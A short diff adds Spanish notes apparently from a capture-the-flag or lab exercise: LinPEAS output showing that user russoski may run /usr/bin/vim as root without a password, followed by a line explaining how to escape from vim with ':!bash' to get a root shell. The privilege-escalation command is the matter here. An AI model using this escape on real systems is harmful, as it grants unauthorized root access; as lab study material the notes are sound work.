@@ -1,1 +1,15 @@
+RESULTADO DE LinPeas
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
+Matching Defaults entries for russoski on 4ae7a068a4b7:                                                                                                     
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User russoski may run the following commands on 4ae7a068a4b7:
+    (root) NOPASSWD: /usr/bin/vim
+
+
+Esto nos permite con el usuario russoski hacer un $ sudo /usr/bin/vim y dentro escribir :!bash o :!sh para obtener una shell como root.
+
+#################################
 
